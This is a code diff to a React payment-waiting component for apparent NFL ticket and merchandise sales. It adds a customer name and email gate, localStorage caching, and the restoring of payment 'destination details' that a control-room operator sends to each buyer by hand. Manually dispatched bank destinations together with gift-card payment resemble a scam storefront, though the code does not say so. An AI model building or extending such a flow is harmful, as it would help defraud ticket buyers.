@@ -16,7 +16,11 @@ import {
   Building2,
   Smartphone,
   CheckCircle2,
-  Lock
+  Lock,
+  UserCheck,
+  User,
+  Mail,
+  Phone
 } from "lucide-react";
 import { QRCodeSVG } from "qrcode.react";
 import { 
@@ -41,6 +45,7 @@ interface CustomerPaymentWaitingTerminalProps {
   customerPhone?: string;
   itemTitle: string;
   itemType: "ticket" | "experience" | "merchandise" | "deposit";
+  onCustomerDetailsChange?: (details: { name: string; email: string; phone: string }) => void;
   onSwitchToGiftCard?: () => void;
   onPaymentSubmitted?: (referenceTag: string, receiptUrl: string) => void;
 }
@@ -55,6 +60,7 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
   customerPhone,
   itemTitle,
   itemType,
+  onCustomerDetailsChange,
   onSwitchToGiftCard,
   onPaymentSubmitted
 }) => {
@@ -67,6 +73,17 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [elapsedSeconds, setElapsedSeconds] = useState(0);
 
+  // Internal state for customer inputs so customer can fill details here or via parent
+  const [internalName, setInternalName] = useState<string>(() => {
+    return customerName || localStorage.getItem("nfl_guest_sender_name") || "";
+  });
+  const [internalEmail, setInternalEmail] = useState<string>(() => {
+    return customerEmail || localStorage.getItem("nfl_guest_buyer_email") || "";
+  });
+  const [internalPhone, setInternalPhone] = useState<string>(() => {
+    return customerPhone || localStorage.getItem("nfl_guest_buyer_phone") || "";
+  });
+
   // Sync activeSessionId if sessionId prop changes
   useEffect(() => {
     if (sessionId) {
@@ -74,51 +91,109 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
     }
   }, [sessionId]);
 
-  // Check for previous dispatched reply when customer name and payment method are selected
+  const isGeneric = (name?: string) => {
+    if (!name) return true;
+    const n = name.trim().toLowerCase();
+    return !n || ["customer", "vip guest", "ticket guest", "guest", "vip member", "patriots collector"].includes(n);
+  };
+
+  useEffect(() => {
+    if (customerName && !isGeneric(customerName)) {
+      setInternalName(customerName);
+    }
+  }, [customerName]);
+
+  useEffect(() => {
+    if (customerEmail && customerEmail.includes("@")) {
+      setInternalEmail(customerEmail);
+    }
+  }, [customerEmail]);
+
+  useEffect(() => {
+    if (customerPhone) {
+      setInternalPhone(customerPhone);
+    }
+  }, [customerPhone]);
+
+  const effectiveName = internalName.trim();
+  const effectiveEmail = internalEmail.trim();
+  const effectivePhone = internalPhone.trim();
+
+  // Identified customer gate: must have filled a genuine name (>= 2 chars) and email
+  const isIdentified = Boolean(
+    effectiveName.length >= 2 && 
+    !isGeneric(effectiveName) && 
+    effectiveEmail.length >= 3 && 
+    effectiveEmail.includes("@")
+  );
+
+  const handleDetailsUpdate = (name: string, email: string, phone: string) => {
+    setInternalName(name);
+    setInternalEmail(email);
+    setInternalPhone(phone);
+    if (name && !isGeneric(name)) {
+      localStorage.setItem("nfl_guest_sender_name", name);
+    }
+    if (email) {
+      localStorage.setItem("nfl_guest_buyer_email", email);
+    }
+    if (phone) {
+      localStorage.setItem("nfl_guest_buyer_phone", phone);
+    }
+    if (onCustomerDetailsChange) {
+      onCustomerDetailsChange({ name, email, phone });
+    }
+  };
+
+  // Check for previous dispatched reply when customer name and payment method are selected.
+  // If operator has responded before, the response immediately pops up!
   useEffect(() => {
     let isMounted = true;
-    const normName = customerName?.trim().toLowerCase() || "";
-    const isGeneric = !normName || normName === "customer" || normName === "vip guest" || normName === "ticket guest" || normName === "guest";
-    const cacheKey = `nfl_dispatched_${selectedMethod}_${normName}`;
+    const normName = effectiveName.toLowerCase();
+    const hasValidIdentity = !isGeneric(effectiveName) && effectiveName.length >= 2;
 
-    // 1. Instant cache check
-    if (!isGeneric && normName.length >= 2) {
-      try {
-        const cached = localStorage.getItem(cacheKey);
-        if (cached) {
-          const parsed = JSON.parse(cached);
-          if (parsed && (parsed.identifier || parsed.accountNumber || parsed.bankName)) {
-            setSession({
-              id: activeSessionId || sessionId,
-              orderId: orderReference || sessionId,
-              customerName: customerName || "Customer",
-              customerEmail: customerEmail || "",
-              customerPhone: customerPhone || "",
-              itemType,
-              itemTitle,
-              amount,
-              paymentMethod: selectedMethod,
-              status: "details_provided",
-              adminPaymentDetails: parsed,
-              createdAt: Date.now(),
-              updatedAt: Date.now()
-            });
-            setRecoveredFromPrevious(true);
-          }
-        }
-      } catch (e) {
-        // ignore cache parse error
-      }
+    if (!hasValidIdentity) {
+      setRecoveredFromPrevious(false);
+      return;
     }
 
-    // 2. Query Firestore for previously dispatched session
+    const cacheKey = `nfl_dispatched_${selectedMethod}_${normName}`;
+
+    // 1. Instant local cache check (0ms response)
+    try {
+      const cached = localStorage.getItem(cacheKey);
+      if (cached) {
+        const parsed = JSON.parse(cached);
+        if (parsed && (parsed.identifier || parsed.accountNumber || parsed.bankName)) {
+          setSession({
+            id: activeSessionId || sessionId,
+            orderId: orderReference || sessionId,
+            customerName: effectiveName,
+            customerEmail: effectiveEmail,
+            customerPhone: effectivePhone,
+            itemType,
+            itemTitle,
+            amount,
+            paymentMethod: selectedMethod,
+            status: "details_provided",
+            adminPaymentDetails: parsed,
+            createdAt: Date.now(),
+            updatedAt: Date.now()
+          });
+          setRecoveredFromPrevious(true);
+        }
+      }
+    } catch (e) {
+      // ignore cache parse error
+    }
+
+    // 2. Query Firestore for previously dispatched session by the operator for this customer & method
     async function checkPreviousDispatchedSession() {
-      if (!normName || isGeneric || normName.length < 2) return;
       try {
         const previousSession = await findRecentDispatchedSessionForCustomer(
-          customerName!,
+          effectiveName,
           selectedMethod,
-          customerEmail
+          effectiveEmail
         );
         if (previousSession && isMounted) {
           setSession(previousSession);
@@ -132,9 +207,9 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
             createOrUpdatePaymentSession({
               id: sessionId,
               orderId: orderReference || sessionId,
-              customerName: customerName || "Customer",
-              customerEmail: customerEmail || "",
-              customerPhone: customerPhone || "",
+              customerName: effectiveName,
+              customerEmail: effectiveEmail,
+              customerPhone: effectivePhone,
               itemType,
               itemTitle,
               amount,
@@ -153,7 +228,7 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
 
     // 3. Set up real-time listener for any dispatched sessions matching this customer and method
     const unsubCustomer = subscribeToCustomerDispatchedSession(
-      customerName || "",
+      effectiveName,
       selectedMethod,
       (dispatchedSession) => {
         if (dispatchedSession && isMounted) {
@@ -165,26 +240,27 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
           }
         }
       },
-      customerEmail
+      effectiveEmail
     );
 
     return () => {
       isMounted = false;
       unsubCustomer();
     };
-  }, [customerName, selectedMethod, customerEmail, sessionId, activeSessionId, amount, itemTitle, itemType, orderReference]);
+  }, [effectiveName, selectedMethod, effectiveEmail, effectivePhone, sessionId, activeSessionId, amount, itemTitle, itemType, orderReference]);
 
-  // Real-time listener for activeSessionId
+  // Real-time listener and session creation: ONLY trigger if customer is identified!
   useEffect(() => {
+    if (!isIdentified) return;
     const targetSessionId = activeSessionId || sessionId;
     if (!targetSessionId) return;
 
     createOrUpdatePaymentSession({
       id: targetSessionId,
       orderId: orderReference || targetSessionId,
-      customerName: customerName || "Customer",
-      customerEmail: customerEmail || "",
-      customerPhone: customerPhone || "",
+      customerName: effectiveName,
+      customerEmail: effectiveEmail,
+      customerPhone: effectivePhone,
       itemType,
       itemTitle,
       amount,
@@ -194,8 +270,8 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
     const unsubscribe = subscribeToPaymentSession(targetSessionId, (updatedSession) => {
       if (updatedSession) {
         setSession(updatedSession);
-        if (updatedSession.adminPaymentDetails && customerName) {
-          const normName = customerName.trim().toLowerCase();
+        if (updatedSession.adminPaymentDetails && effectiveName) {
+          const normName = effectiveName.trim().toLowerCase();
           const cacheKey = `nfl_dispatched_${selectedMethod}_${normName}`;
           localStorage.setItem(cacheKey, JSON.stringify(updatedSession.adminPaymentDetails));
         }
@@ -203,7 +279,7 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
     });
 
     return () => unsubscribe();
-  }, [activeSessionId, sessionId, selectedMethod, amount, customerName, customerEmail, customerPhone, itemTitle, itemType, orderReference]);
+  }, [activeSessionId, sessionId, selectedMethod, amount, effectiveName, effectiveEmail, effectivePhone, itemTitle, itemType, orderReference, isIdentified]);
 
   // Elapsed timer for waiting experience
   useEffect(() => {
@@ -249,8 +325,91 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
     <div className="space-y-4">
       {/* Real-time State Card */}
       <AnimatePresence mode="wait">
-        {!isDetailsAvailable ? (
-          /* STATE 1: AWAITING PAYMENT DETAILS FROM CONTROL ROOM */
+        {/* STATE 0: CUSTOMER DETAILS REQUIRED BEFORE REQUESTING PAYMENT DETAILS */}
+        {!isIdentified && !isDetailsAvailable ? (
+          <motion.div
+            key="identification-required"
+            initial={{ opacity: 0, y: 8 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -8 }}
+            className="p-5 bg-zinc-950 border border-blue-500/30 rounded-2xl space-y-4 relative overflow-hidden"
+          >
+            <div className="flex items-center justify-between border-b border-white/5 pb-3">
+              <div className="flex items-center gap-2">
+                <div className="w-6 h-6 rounded-lg bg-blue-500/20 text-blue-400 flex items-center justify-center">
+                  <UserCheck className="w-3.5 h-3.5" />
+                </div>
+                <span className="text-[10px] font-black uppercase tracking-wider text-blue-400">
+                  Customer Details Required Before Requesting Destination
+                </span>
+              </div>
+              <span className="text-[9px] font-mono font-bold text-zinc-500 uppercase bg-zinc-900 px-2 py-0.5 rounded border border-white/5">
+                Ref: {orderReference || sessionId}
+              </span>
+            </div>
+
+            <div className="space-y-1">
+              <h4 className="text-xs font-black uppercase tracking-wider text-white">
+                Please Enter Your Name & Contact Information
+              </h4>
+              <p className="text-[11px] text-zinc-300 leading-relaxed">
+                Please fill in your details below before requesting official payment destination details. This allows our Control Room operator to identify your order. If you previously requested payment details with this name, your assigned destination details will <strong className="text-emerald-400">immediately pop up</strong>.
+              </p>
+            </div>
+
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
+              <div className="space-y-1">
+                <label className="text-[9px] font-black uppercase text-zinc-400 block">
+                  Full Name / Sender Name <span className="text-red-400">*</span>
+                </label>
+                <div className="relative">
+                  <User className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-2.5" />
+                  <input
+                    type="text"
+                    required
+                    placeholder="e.g. John Doe"
+                    value={internalName}
+                    onChange={(e) => handleDetailsUpdate(e.target.value, internalEmail, internalPhone)}
+                    className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-9 pr-3 py-2 text-xs font-bold text-white focus:outline-none focus:ring-1 focus:ring-blue-500 uppercase"
+                  />
+                </div>
+              </div>
+
+              <div className="space-y-1">
+                <label className="text-[9px] font-black uppercase text-zinc-400 block">
+                  Email Address <span className="text-red-400">*</span>
+                </label>
+                <div className="relative">
+                  <Mail className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-2.5" />
+                  <input
+                    type="email"
+                    required
+                    placeholder="name@example.com"
+                    value={internalEmail}
+                    onChange={(e) => handleDetailsUpdate(internalName, e.target.value, internalPhone)}
+                    className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-9 pr-3 py-2 text-xs font-bold text-white focus:outline-none focus:ring-1 focus:ring-blue-500 lowercase"
+                  />
+                </div>
+              </div>
+            </div>
+
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-1">
+              <p className="text-[10px] text-zinc-500">
+                Filling in your name allows the operator to verify your identity and send your official pass.
+              </p>
+              {onSwitchToGiftCard && (
+                <button
+                  type="button"
+                  onClick={onSwitchToGiftCard}
+                  className="px-3 py-1.5 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 font-black text-[9px] uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all self-start sm:self-auto cursor-pointer"
+                >
+                  <Gift className="w-3 h-3" /> Pay With Gift Card (Instant)
+                </button>
+              )}
+            </div>
+          </motion.div>
+        ) : !isDetailsAvailable ? (
+          /* STATE 1: AWAITING PAYMENT DETAILS FROM CONTROL ROOM (IDENTIFIED CUSTOMER) */
           <motion.div
             key="awaiting"
             initial={{ opacity: 0, y: 8 }}
@@ -269,8 +428,8 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
                   Control Room Dispatch Terminal
                 </span>
               </div>
-              <span className="text-[9px] font-mono font-bold text-zinc-500 uppercase bg-zinc-900 px-2 py-0.5 rounded border border-white/5">
-                Session Ref: {sessionId}
+              <span className="text-[9px] font-mono font-bold text-zinc-400 uppercase bg-zinc-900 px-2 py-0.5 rounded border border-white/5">
+                Customer: <strong className="text-white">{effectiveName}</strong>
               </span>
             </div>
 
@@ -285,7 +444,10 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
                     Awaiting Payment Details from Control Room
                   </h4>
                   <p className="text-[11px] text-zinc-300 leading-relaxed">
-                    Please stay on this screen. Our Control Room operator is currently inputting verified destination payment details for your <strong className="text-amber-400 uppercase font-mono">${amount.toLocaleString()}</strong> order via <strong className="text-white uppercase">{selectedMethod}</strong>.
+                    Our Control Room operator has received your request for <strong className="text-white uppercase">{effectiveName}</strong> and is preparing verified destination payment details for your <strong className="text-amber-400 uppercase font-mono">${amount.toLocaleString()}</strong> order via <strong className="text-white uppercase">{selectedMethod}</strong>.
+                  </p>
+                  <p className="text-[10px] text-zinc-400">
+                    If you step away, your payment details will be waiting for you. Anytime you re-enter your name and choose <strong className="text-zinc-200 uppercase">{selectedMethod}</strong>, the operator's response will immediately pop up!
                   </p>
                 </div>
               </div>
@@ -320,7 +482,7 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
             )}
           </motion.div>
         ) : (
-          /* STATE 2: PAYMENT DETAILS RECEIVED - PROCEED NOW */
+          /* STATE 2: PAYMENT DETAILS RECEIVED / RESTORED - PROCEED NOW */
           <motion.div
             key="details-received"
             initial={{ opacity: 0, scale: 0.98 }}
@@ -347,17 +509,17 @@ export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerm
                   </h4>
                   <p className="text-[10px] text-zinc-300 font-medium">
                     {recoveredFromPrevious
-                      ? `Welcome back ${customerName || ""}! We restored the official ${selectedMethod.toUpperCase()} payment details previously provided by the operator for your request.`
-                      : "Send exact payment using the details below, then enter your confirmation reference."}
+                      ? `Welcome back ${effectiveName || ""}! The official ${selectedMethod.toUpperCase()} destination details previously provided by our operator have immediately popped up.`
+                      : `Verified destination details for ${effectiveName || "your order"}. Send exact payment using the details below, then enter your confirmation reference.`}
                   </p>
                 </div>
               </div>
-              <span className={`text-[9px] font-mono px-2 py-0.5 rounded font-black uppercase ${
+              <span className={`text-[9px] font-mono px-2 py-0.5 rounded font-black uppercase shrink-0 ${
                 recoveredFromPrevious 
                   ? "text-blue-400 bg-blue-500/20 border border-blue-500/30" 
                   : "text-emerald-400 bg-emerald-500/20"
               }`}>
-                {recoveredFromPrevious ? "Saved Reply Restored" : "Verified Ready"}
+                {recoveredFromPrevious ? "Immediate Response Restored" : "Verified Ready"}
               </span>
             </div>
 
